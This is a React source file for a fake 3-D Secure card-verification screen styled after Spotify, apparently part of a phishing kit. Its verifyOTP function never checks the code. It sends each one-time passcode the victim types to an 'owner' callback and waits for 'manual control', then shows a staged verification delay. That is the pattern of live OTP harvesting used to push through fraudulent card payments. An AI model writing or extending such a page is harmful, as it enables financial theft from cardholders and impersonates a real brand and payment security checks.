"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Input } from "@/components/ui/input"
import { t, type Language } from "@/lib/translations"
// Removed SpotifyHeader and SpotifyFooter as per user request

interface ThreeDSecureProps {
  mode: "app" | "otp"
  onSuccess: () => void
  onOTPAttempt?: (otp: string, isCorrect: boolean) => void
  language?: Language
  error?: string
}

export function ThreeDSecure({ mode, onSuccess, onOTPAttempt, language = "en", error: externalError }: ThreeDSecureProps) {
  const [otp, setOtp] = useState("")
  const [internalError, setInternalError] = useState("")
  const [showNotification, setShowNotification] = useState(true)
  const [notificationDots, setNotificationDots] = useState(0)
  const [isVerifying, setIsVerifying] = useState(false)

  // Use external error if provided, otherwise use internal error
  const displayError = externalError || internalError

  // Simulate phone notification dots animation
  useEffect(() => {
    if (mode === "app" && showNotification) {
      const interval = setInterval(() => {
        setNotificationDots((prev) => (prev + 1) % 4)
      }, 300)
      return () => clearInterval(interval)
    }
  }, [showNotification, mode])

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6)
    setOtp(value)
    setInternalError("")

    // Auto-verify when 6 digits are entered
    if (value.length === 6) {
      verifyOTP(value)
    }
  }

  const verifyOTP = (otpValue: string) => {
    // In this flow, we notify the owner and wait for manual control
    onOTPAttempt?.(otpValue, false)
    setIsVerifying(true)
    
    // Simulate a brief verification delay
    setTimeout(() => {
      setIsVerifying(false)
    }, 2000)
  }

  return (
    <div className="flex flex-col min-h-screen w-full bg-[#121212]">
      <main className="flex-1 flex flex-col items-center justify-center py-12">
        <div className="w-full max-w-[500px] mx-auto px-4 sm:px-0">
          {/* Header - Centered */}
          <div className="mb-8 text-center">
            <h1 className="text-2xl sm:text-[32px] font-bold text-white mb-2">
              {mode === "app" ? t("3ds.title", language) : "Verification Required"}
            </h1>
            <p className="text-[#a7a7a7] text-sm sm:text-base">
              {mode === "app" ? t("3ds.subtitle", language) : "Please enter the verification code sent to your device."}
            </p>
          </div>

          <div className="bg-[#282828] rounded-lg p-6 sm:p-8 space-y-6">
            {mode === "app" ? (
              /* Phone Notification Section */
              <div className="bg-[#1a1a1a] rounded-lg p-4 sm:p-6 border border-[#404040]">
                <div className="flex items-start sm:items-center justify-between mb-4 gap-2">
                  <div className="flex items-start sm:items-center gap-3">
                    <svg className="w-6 h-6 text-[#1ed760] flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M18 8h-1V4c0-.55-.45-1-1-1H8c-.55 0-1 .45-1 1v4H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 11c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm3.5-9H6.5V4h9v6z" />
                    </svg>
                    <div>
                      <p className="text-white font-bold text-sm sm:text-base">{t("3ds.checkNotification", language)}</p>
                      <p className="text-[#a7a7a7] text-xs sm:text-sm">{t("3ds.notificationInfo", language)}</p>
                    </div>
                  </div>
                </div>

                {/* Animated Waiting Dots */}
                {showNotification && (
                  <div className="flex justify-center gap-2 py-4">
                    {[0, 1, 2].map((i) => (
                      <div
                        key={i}
                        className={`w-3 h-3 rounded-full transition-all ${
                          i <= notificationDots ? "bg-[#1ed760]" : "bg-[#404040]"
                        }`}
                      />
                    ))}
                  </div>
                )}
              </div>
            ) : (
              /* OTP Input Section */
              <div>
                <h3 className="text-white font-bold mb-4 text-sm sm:text-base">{t("3ds.enterOTP", language)}</h3>

                <div className="space-y-4">
                  <div>
                    <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("3ds.otpCode", language)}</label>
                    <Input
                      type="text"
                      placeholder={t("3ds.otpPlaceholder", language)}
                      value={otp}
                      onChange={handleOtpChange}
                      maxLength={6}
                      inputMode="numeric"
                      pattern="[0-9]*"
                      disabled={isVerifying}
                      className={`w-full h-12 sm:h-14 bg-[#1a1a1a] border-2 rounded-md text-white placeholder:text-[#666666] px-4 focus:ring-0 text-center text-base sm:text-2xl tracking-widest font-bold transition-colors ${
                        displayError ? "border-red-500" : "border-[#404040] focus:border-white"
                      }`}
                    />
                    {displayError && <p className="text-red-500 text-xs sm:text-sm mt-2 text-center font-bold">{displayError}</p>}
                  </div>
                </div>
              </div>
            )}

            {/* Security Info */}
            <div className="flex items-start gap-3 text-xs sm:text-sm text-[#a7a7a7]">
              <svg className="w-5 h-5 text-[#1ed760] flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
              </svg>
              <p>{t("3ds.security", language)}</p>
            </div>
          </div>
        </div>
      </main>
    </div>
  )
}
